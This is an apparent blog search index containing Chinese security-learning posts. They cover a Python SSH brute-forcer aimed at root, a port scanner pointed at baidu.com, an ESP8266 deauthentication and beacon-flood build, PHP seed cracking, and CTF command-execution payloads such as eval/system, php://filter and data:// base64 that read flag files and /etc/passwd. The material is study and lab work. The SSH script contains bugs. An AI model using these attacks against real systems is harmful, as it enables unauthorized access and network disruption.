<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>python实现ssh爆破</title>
    <link href="/2021/10/03/python2/"/>
    <url>/2021/10/03/python2/</url>
    
    <content type="html"><![CDATA[<h2 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h2><p>SSh服务提供远程登录主机，方便管理远程主机（22端口）（类似TELNET服务23端口）</p><p>ssh服务传输过程中对数据包根据SSH协议加密处理</p><p>SSH有两种登陆方式</p><p>1、账号密码登录</p><p>2、密钥登录</p><p>公钥：在/.ssh/authorized_keys文件中</p><p>私钥：进行登录</p><h2 id="爆破流程"><a href="#爆破流程" class="headerlink" title="爆破流程"></a>爆破流程</h2><p>  <strong>文件读密码</strong>（枚举）</p><p>​              <strong>⇩</strong></p><p><strong>Paramiko-ssh客户端</strong>（尝试登陆）</p><p>​              <strong>⇩</strong></p><p>   <strong>异常处理判断</strong></p><p>​               <strong>⇩</strong></p><p>​      <strong>成功、失败</strong></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> paramiko<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> queue<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">burst</span>(<span class="hljs-params">q</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> q.empty():<br>     password=q.get()<br>            <span class="hljs-keyword">try</span>:<br><br>client=paramiko.SSHClient()<br><br>client.set_missing_host_key_policy(paramiko.AutoAddpolicy())<br><br>client.connect(hostname=<span class="hljs-string">&#x27;192.168.45.136&#x27;</span>,username=<span class="hljs-string">&#x27;root&#x27;</span>,password=<span class="hljs-string">&#x27;passwd&#x27;</span>,timeout=<span class="hljs-number">1</span>)<br><br>client.close()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;密码正确<span class="hljs-subst">&#123;passwd&#125;</span>\n&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>           <span class="hljs-keyword">except</span>:<br><br>               <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;密码错误<span class="hljs-subst">&#123;passwd&#125;</span>\n&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>q=queue.Queue()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dict.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>q.put(i.strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>threading.Thread(target=burst,args=(q,)).strat()<br></code></pre></td></tr></table></figure><p>这里的脚本和上一个写的脚本结构大体相同，思路也差不多，都是调用了线程，这里连接使用了paramiko模块，使用pip install命令安装一下即可。</p><p>那下面就只对不同的部分写一些解释：</p><p><strong>1、</strong>首先SSH爆破用到了字典，需要使用字典生成工具生成或者自己写一些密码字典。然后是字典的读取使用操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dict.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>       <span class="hljs-built_in">print</span>(f.read())<br></code></pre></td></tr></table></figure><p>这串代码能够输出dict.txt里的全部字典，但是在爆破密码时，我们需要逐个对字典里的密码进行尝试，所以就使用了了readlines()方法,readlines() 方法返回一个列表，其中包含文件中的每一行作为列表项。在嵌套循环结构就能得到每一个密码</p><p>另外在txt格式的字典中密码都是这样排列</p><p>admin</p><p>123</p><p>456</p><p>这种每行一个的密码后面读取出来都会有换行符，这就需要使用i.strip(‘\n’)来删除，避免尝试密码时造成干扰</p><p><strong>2、</strong>关于连接主机时的验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">client.connect(hostname=<span class="hljs-string">&#x27;192.168.45.136&#x27;</span>,username=<span class="hljs-string">&#x27;root&#x27;</span>,password=<span class="hljs-string">&#x27;passwd&#x27;</span>,timeout=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>在这条语句执行时，客户端回去从know_hosts文件中读取连接主机，如果主机不在文件中，无法与主机进行连接</p><p>解决方法：</p><p>添加一行代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">client.set_missing_host_key_policy(paramiko.AutoAddpolicy())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python端口扫描脚本编写思路</title>
    <link href="/2021/09/30/python/"/>
    <url>/2021/09/30/python/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于没有学习python编程，web的脚本编写题一直是个空缺，虽然之前简单学习了些python基础，但是毕竟没有实战编写过脚本，理解和更改脚本总感觉有些吃力，正好马上就是国庆假期，赶上三个雨天还真是巧，出去玩就不要想了，在学校学习一下python脚本的编写吧</p><p>这篇文章先从一个简单的端口扫描脚本开始，作为初学者，我尽可能将过程写的详细一些</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>端口扫描脚本的作用说白了就是模拟人工去依次访问65536个端口，想编写出这个脚本还是要参照人工是如何操作的</p><p>人工去测试的话，首先我会找到能够连接目标服务器的浏览器，这里在python中的体现就是建立通信</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket //socket模块用于计算机通信<br><br>client=socket.socket()//形成一个可以和目标端口连接的客户端<br></code></pre></td></tr></table></figure><p>这两行代码就模拟了对目标访问前的准备，正好刚学习了java，发现这一部分和java的scanner输入代码比较相似，可以类比理解一下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner<br><br>Scanner sc=<span class="hljs-keyword">new</span> Scanner(System.in);<br></code></pre></td></tr></table></figure><p>然后我会在浏览器输入目标域名加端口测试，是否能够连通，连通就代表开放，没有连通就代表不开放</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">client.connect((<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,port)) <br>//连接目标端口，将端口设置为变量接受队列的传入便于爆破<br><span class="hljs-built_in">print</span>(port)<br>    //连接成功就打印出端口号<br></code></pre></td></tr></table></figure><p>由于我们需要测试65536个端口，所以在没有测试完前不能让代码停下来，这里就引入python的异常处理try:   except:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>: //设置异常处理，没有成功连接则进入<span class="hljs-keyword">except</span>执行<br>            client=socket.socket() <br>            client.connect((<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,port))<br><span class="hljs-built_in">print</span>(port) <br><br><span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span> //无操作，继续向下执行<br></code></pre></td></tr></table></figure><p>还有一个问题就是这里端口我是用port变量来表示，要想访问65536个端口还需要不断给port传参，这里我们使用python中的队列来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">q=queue.Queue() //定义一个q队列<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>): //共有<span class="hljs-number">65536</span>个端口<br>    q.put(i) //将<span class="hljs-number">65536</span>个端口循环放入队列<br></code></pre></td></tr></table></figure><p>执行后得到了65536个数字的队列q，再使用循环不断将q的值传入port变量就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> queue//引入队列<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">q</span>):</span> //将访问端口代码封装成scan函数，传入队列q<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> q.empty():<br>        port=q.get() //队列不为空就从队列中拿出一个数字传给port<br>        <span class="hljs-keyword">try</span>: <br>            socket.setdefaulttimeout(<span class="hljs-number">1</span>) //设置<span class="hljs-number">1</span>秒超时<br>            client=socket.socket() <br>            client.connect((<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,port)) <br><span class="hljs-built_in">print</span>(port)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span> <br><br>q=queue.Queue() <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>): <br>    q.put(i) <br></code></pre></td></tr></table></figure><p>这样一个简单的扫描就做好了，但是作为脚本还要求短时间内快速完成大量重复性任务，所以下面要写入多线程去执行</p><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>多线程，是指从软件或者硬件上实现多个线程并发执行的技术。具有多线程能力的计算机因有硬件支持而能够在同一时间执行多于一个线程，进而提升整体处理性能。</p><h3 id="threading-thread-的简单使用"><a href="#threading-thread-的简单使用" class="headerlink" title="threading.thread()的简单使用"></a>threading.thread()的简单使用</h3><p>threading模块是Python里面常用的线程模块</p><p>用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">threading.Thread(target``=``xxxx,args``=``(xxxx)).start()<br></code></pre></td></tr></table></figure><p>target:线程要执行的方法</p><p>args:要传入的参数</p><p>在上面我们已经把扫描的代码块封装成scan方法，而传入的参数就是q队列，为了让脚本快一点，这里我把线程设置为10000</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>): //创建一万个线程<br>    threading.Thread(target=scan,args=(q,)).start() <br>    //调用Thread方法<br></code></pre></td></tr></table></figure><p>这样一个完整的脚本就完成了，这里用这个脚本测试一下百度开放的端口：</p><p><img src="/pythonimg/2.png"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket //socket用于计算机通讯<br><span class="hljs-keyword">import</span> threading,queue //调用线程模块和队列模块<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">q</span>):</span> //将访问端口代码封装成scan函数，传入队列q<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> q.empty():<br>        port=q.get() //队列不为空就从队列中拿出一个数字传给port<br>        <span class="hljs-keyword">try</span>: //设置异常处理，没有成功连接则进入<span class="hljs-keyword">except</span>执行<br>            socket.setdefaulttimeout(<span class="hljs-number">1</span>) //设置<span class="hljs-number">1</span>秒超时<br>            client=socket.socket() <br>            //形成一个可以和目标端口连接的客户端<br>            client.connect((<span class="hljs-string">&#x27;www.baidu.com&#x27;</span>,port)) <br>            //连接目标端口，将端口设置为变量接受队列的传入便于爆破<br><span class="hljs-built_in">print</span>(port) //连接成功即打印出来<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span> //无操作，继续向下执行<br><br>q=queue.Queue() //定义一个q队列<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>): //共有<span class="hljs-number">65536</span>个端口<br>    q.put(i) //将<span class="hljs-number">65536</span>个端口循环放入队列<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>): //创建一万个线程<br>    threading.Thread(target=scan,args=(q,)).start() <br>    //调用Thread方法<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>esp8266wifi模块制作wifi杀手</title>
    <link href="/2021/09/23/wifikill/"/>
    <url>/2021/09/23/wifikill/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天在一篇博客上看到一篇文章，用20元制作一个wifi杀手拯救沉迷网络游戏的朋友，感觉比较实用，于是就去淘宝下单买了一个esp8266wifi模块，打算自己动手做一个。买之前要避坑，虽然三代比二代性能好也贵一点，但是三代不支持刷杀手固件。</p><p>附图：</p><p><img src="/wifikillimg/1.jpg"></p><p>商家还发了一块 0.96OLED，我暂时还不会用，有待开发，不过看b站大神们能用这块屏幕播放出bad apple</p><p><img src="/wifikillimg/2.jpg"></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>wifi杀手的原理是通过发送取消认证报文让客户端以为路由器需要让自己断开连接从而断开wifi，伪造路由器向客户端发送取消认证报文，使客户端主动断开wifi连接。并且支持自定义热点伪造（批量生成假Wi-Fi信号）。</p><p>而这里的esp8266模块是个载体，把固件烧录到模块内，就能得到一个便携的杀手了</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>首先要安装对应的驱动CH341SER，这个可以从官网直接下载，下载之后解压找到对应的程序安装即可</p><p><img src="/wifikillimg/3.jpg"></p><p>然后用microusb数据线（必须是数据线，普通的充电线检测不到）连接模块和电脑，打开设备管理器能够看到端口处多了新的硬件，记住这个端口号COM4</p><p><img src="/wifikillimg/4.png"></p><p>然后打开烧录软件，这里填写需要烧录的固件路径，填写正确会变成绿色，杀手的固件在github上开源，可以自行下载</p><p><img src="/wifikillimg/5.png" alt="5"></p><p>然后点到Advanced界面，这里的参数在板子的后面可以看到，对照填写就好，最后回到Operation界面点击flash等待烧录完成即可，烧录完成后左下角会有绿色的对勾。</p><p><img src="/wifikillimg/6.png"></p><p><img src="/wifikillimg/7.png"></p><p>完成后就可以拔下来了，usb口连接一个稳定的电源，这时在手机或者电脑上可以看到一个新wifi，Wi-PWN，连接后进去192.168.4.1页面设置密码，重新连接后刷新页面即可进入杀手程序</p><p><img src="/wifikillimg/8.jpg" alt="8"></p><p>这里是能扫描到的附近的wifi，测试了几次应该只对2.4Ghz频段的wifi有效果，这里我自己开一个名为tt热点测试一下,通过scan扫描到这个wifi，选中然后点击右下角的attack进入攻击模式页面，先试一下Deauth攻击</p><p><img src="/wifikillimg/9.jpg"></p><p><img src="/wifikillimg/10.jpg"></p><p>开始攻击选中的WiFi，然后我在手机连接这个wifi看一下效果</p><p><img src="/wifikillimg/14.jpg"></p><p><img src="/wifikillimg/13.jpg"></p><p>可以看到手机端无限断开重连，无法正常连接网络，关闭Deauth攻击后恢复正常</p><p>再测试一下beacon，这个模式的效果是创建大量虚假wifi，我设置wifi名为测试，数量为48个，点击开始进行测试</p><p><img src="/wifikillimg/12.jpg"></p><p><img src="/wifikillimg/15.jpg"></p><p>可以看到此时手机已经被名为测试的虚假wifi刷屏了。</p><p>那到此便携的杀手就已经配置完成了</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p> 当然这个模块还是有很大局限性的</p><p>它只能针对没有防护的2.4Ghz频段进行攻击，对5G频段无效，而且范围也只比家用wifi差不多，对普通人来说不会造成太大的损失，被攻击的话可能会排位掉颗星星吧，哈哈</p><p>最后还是要谨记了解和自己复现漏洞的目的都只是为了学习和更好的了解网络安全，而不是依赖技术去攻击别人</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php伪随机数及爆破脚本的使用</title>
    <link href="/2021/09/20/test4/"/>
    <url>/2021/09/20/test4/</url>
    
    <content type="html"><![CDATA[<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>mt_srand()：</p><p>mt_rand()  ：</p><h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>mt_srand()： </p><p>播种 Mersenne Twister 随机数生成器。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mt_srand</span><span class="hljs-params">(seed)</span></span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">seed</td><td align="left">必需。用 seed 来给随机数发生器播种。</td></tr></tbody></table><p>mt_rand()  ：</p><blockquote><p>mt_rand():使用 Mersenne Twister 算法返回随机整数。</p><p>语法：mt_rand(min,max);</p><p>参数列表：</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>min</td><td>可选，范围最小数</td></tr><tr><td>max</td><td>可选，范围最大数</td></tr></tbody></table><p>大概意思就是说通过mt_srand(seed)这个函数分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</p><h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p>首先，我是用php代码生成一段随机数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>mt_srand(<span class="hljs-number">123456</span>);<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><p>运行得到结果：</p><p><img src="/test4img/1.png"></p><p>然后在运行一次：</p><p><img src="/test4img/2.png"></p><p>发现两次随机数的结果是一样的，那么我改下代码多输出几次试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>mt_srand(<span class="hljs-number">123456</span>);    <br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> mt_rand().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span>    <br></code></pre></td></tr></table></figure><p>运行两次：</p><p><img src="/test4img/3.png"></p><p>发现虽然执行时每条随机序列都不一样，但是每次执行的结果却是相同的</p><p>这就是伪随机数的漏洞，生成的伪随机数是线性的，像y=ax+b一样，a就类似于种子，知道伪随机序列后就可以推出种子a</p><h2 id="爆破脚本的利用"><a href="#爆破脚本的利用" class="headerlink" title="爆破脚本的利用"></a>爆破脚本的利用</h2><p>现在官网下载php_mt_seed-PHP mt_rand（）种子破解程序</p><p>[[php_mt_seed - PHP mt_rand() seed cracker (openwall.com)](<a href="https://www.openwall.com/php_mt_seed/)]">https://www.openwall.com/php_mt_seed/)]</a>: 官网网址</p><p>放到kali里解压：</p><p><img src="/test4img/4.png"></p><p>解压之后使用命令更新一下就可以使用了：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-meta">$</span> <span class="hljs-string">make</span><br><span class="hljs-attr">gcc</span> <span class="hljs-string">-Wall -march=native -O2 -fomit-frame-pointer -funroll-loops -fopenmp php_mt_seed.c -o php_mt_seed</span><br></code></pre></td></tr></table></figure><p>然后测试一下刚才使用123456种子生成的伪随机数272665632：</p><p><img src="/test4img/5.png"></p><p>等待一会就得到了种子，这里爆出了8个种子，再把它带回函数验证就能得到正确的种子123456了</p><p>这里需要注意验证时要对应爆出种子的php版本号，还有在使用爆破脚本时尽量取第一个随机序列，如果不是第一次生成的随机数，爆出来的种子，不一定正确</p><p>在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行知识整理（1）</title>
    <link href="/2021/09/16/day1/"/>
    <url>/2021/09/16/day1/</url>
    
    <content type="html"><![CDATA[<h1 id="知识梳理"><a href="#知识梳理" class="headerlink" title="知识梳理"></a>知识梳理</h1><p>最近刷了挺多命令执行的题目，学到了不少新东西，脑子比较乱，在这里整理一下</p><h2 id="利用-GET-的命令执行"><a href="#利用-GET-的命令执行" class="headerlink" title="利用$_GET[]的命令执行"></a>利用$_GET[]的命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><p>c=eval($_GET[1]);&amp;1=system(‘cat flag.php’);</p><p>这样写的好处是通过get参数1来执行cat命令可以绕过对c的正则匹配</p><p>当然也可以使用 echo <code>cat %09 f*</code>这种编码加通配符的方式</p><h2 id="利用include实现的命令执行"><a href="#利用include实现的命令执行" class="headerlink" title="利用include实现的命令执行"></a>利用include实现的命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|eval|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到这里过滤了反引号、echo、分号等,eval也被禁用了，那单纯使用GET[]的方式肯定是不行了</p><p>payload：</p><p>include%09$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</p><p>这里使用php伪协议以base64编码的形式输出flag.php的内容在通过include引入</p><p>这里也考虑过为什么不直接print%09$_GET[1]?&gt;&amp;1=flag.php，这样写多方便</p><p>后来也从别的博客解到了，这样是不行的，二进制分为代码段和数据段，因为这里get传递flag.php的时候不在代码段，只作为字符串传递，输出字符</p><p>利用include还存在一个思路就是包含linux下的/etc/passwd/，它是系统用户配置文件，存储了系统中所有用户的基本信息，并且所有用户都可以对此文件执行读(r)操作。</p><p>include%09$_GET[1]?&gt;&amp;1=/etc/passwd/也是没有问题的</p><p>如果遇到include被过滤的情况可以尝试使用require函数来代替</p><h2 id="利用data伪协议实现的命令执行"><a href="#利用data伪协议实现的命令执行" class="headerlink" title="利用data伪协议实现的命令执行"></a>利用data伪协议实现的命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br></code></pre></td></tr></table></figure><p>这里源码中给出include函数来引入输入</p><p>payload:</p><p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</p><p>data伪协议遇到传入php代码时就会执行php代码，使用base64可以绕过正则匹配，也可以不使用base64用通配符绕过（这里在使用base64时发现了一些问题，在base64编码?&gt;会出现无法被浏览器识别的+导致报错，就可以只保留前面的&lt;?删掉后面的不影响php代码的执行）</p><h2 id="套娃函数命令执行"><a href="#套娃函数命令执行" class="headerlink" title="套娃函数命令执行"></a>套娃函数命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">localeconv()：是一个编程语言函数，返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)<br><br><br>pos()：返回数组中的当前元素的值。<br>这里也可以换成current()，作用和pos类似<br><br><br>array_reverse()：数组逆序<br><br><br>scandir()：获取目录下的文件<br><br><br>next()： 函数将内部指针指向数组中的下一个元素，并输出<br></code></pre></td></tr></table></figure><p>查看目录下的文件名：</p><p>?c=print_r(scandir(pos(localeconv())));</p><p>再用array_reverse()和next()，使指针指向对应的文件，并用highlight_file()输出</p><p>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><p>highlight_file函数也可以用show_source函数来代替</p><h2 id="一些过滤的绕过思路"><a href="#一些过滤的绕过思路" class="headerlink" title="一些过滤的绕过思路"></a>一些过滤的绕过思路</h2><p>1、php被过滤时可以利用短标签&lt;?=来代替&lt;?php</p><p>2、空格被过滤时可以用Tab编码替代</p><p>3、liunx .（点命令）：读取并且在当前的shell中执行文件中的命令</p><p>4、通配符</p><p>5、括号被过滤时应该考虑一些不需要括号的语言结构，如：</p><p>echo print isset unset include require</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>对字节限制的命令注入总结</title>
    <link href="/2021/09/11/test3/"/>
    <url>/2021/09/11/test3/</url>
    
